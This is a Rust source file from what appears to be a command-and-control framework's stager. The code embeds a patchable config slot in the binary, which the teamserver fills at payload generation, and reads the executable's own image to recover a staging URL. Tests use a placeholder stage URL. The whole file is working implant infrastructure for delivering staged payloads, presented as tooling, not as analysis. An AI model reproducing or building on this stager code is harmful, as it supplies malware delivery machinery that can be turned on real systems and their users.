// The stager's own sentinel slot: `WISPCFG\x01` + u16 LE length + JSON +
// zeros in a fixed 4096-byte slot, patched by the teamserver at generation time
// (shared/protocol/payload.go). Same validation rules as the agent's config
// loader: one complete slot, anything else is rejected.
const CFG_SLOT_SIZE: usize = 4096;
const CFG_MAGIC: [u8; 8] = *b"WISPCFG\x01";
const CFG_HEADER: usize = 10;

// #[no_mangle] + #[used] keep the slot as a real .data blob that LTO cannot
// fold away; the payload generator overwrites it in place.
#[used]
#[no_mangle]
pub static STAGE_CFG_SLOT: [u8; CFG_SLOT_SIZE] = make_slot();

const fn make_slot() -> [u8; CFG_SLOT_SIZE] {
    let mut s = [0u8; CFG_SLOT_SIZE];
    s[0] = b'W';
    s[1] = b'I';
    s[2] = b'S';
    s[3] = b'P';
    s[4] = b'C';
    s[5] = b'F';
    s[6] = b'G';
    s[7] = 1;
    s
}

// stage_url reads the stage URL from this process's own image.
pub fn stage_url() -> Option<String> {
    let exe = std::env::current_exe().ok()?;
    let image = std::fs::read(exe).ok()?;
    let slot = find_cfg_slot(&image)?;
    let url = slot.get("staged").and_then(|v| v.as_str()).unwrap_or("");
    if url.is_empty() {
        None
    } else {
        Some(url.to_string())
    }
}

fn find_cfg_slot(image: &[u8]) -> Option<serde_json::Value> {
    let mut found = None;
    let mut saw_marker = false;
    let mut i = 0;
    while i + CFG_MAGIC.len() <= image.len() {
        let Some(off) = image[i..].windows(CFG_MAGIC.len()).position(|w| w == CFG_MAGIC) else {
            break;
        };
        let pos = i + off;
        saw_marker = true;
        i = pos + CFG_MAGIC.len();
        if pos + CFG_SLOT_SIZE > image.len() {
            continue;
        }
        let slot = &image[pos..pos + CFG_SLOT_SIZE];
        let n = u16::from_le_bytes([slot[8], slot[9]]) as usize;
        if n == 0 || n > CFG_SLOT_SIZE - CFG_HEADER {
            continue;
        }
        if slot[CFG_HEADER + n..].iter().any(|&b| b != 0) {
            continue;
        }
        let Ok(v) = serde_json::from_slice::<serde_json::Value>(&slot[CFG_HEADER..CFG_HEADER + n])
        else {
            continue;
        };
        if found.is_some() {
            eprintln!("stager: multiple sentinel slots, refusing to guess");
            return None;
        }
        found = Some(v);
    }
    if found.is_none() && saw_marker {
        eprintln!("stager: malformed sentinel slot");
    }
    found
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn patched_slot_roundtrip() {
        let mut img = vec![0u8; 8192];
        img[100..108].copy_from_slice(&CFG_MAGIC);
        let json = br#"{"staged":"http://h/stage/abc"}"#;
        img[108..110].copy_from_slice(&(json.len() as u16).to_le_bytes());
        img[110..110 + json.len()].copy_from_slice(json);
        let v = find_cfg_slot(&img).unwrap();
        assert_eq!(v["staged"], "http://h/stage/abc");
    }

    #[test]
    fn empty_slot_is_not_a_config() {
        let mut img = vec![0u8; 8192];
        img[100..108].copy_from_slice(&CFG_MAGIC);
        assert!(find_cfg_slot(&img).is_none());
    }
}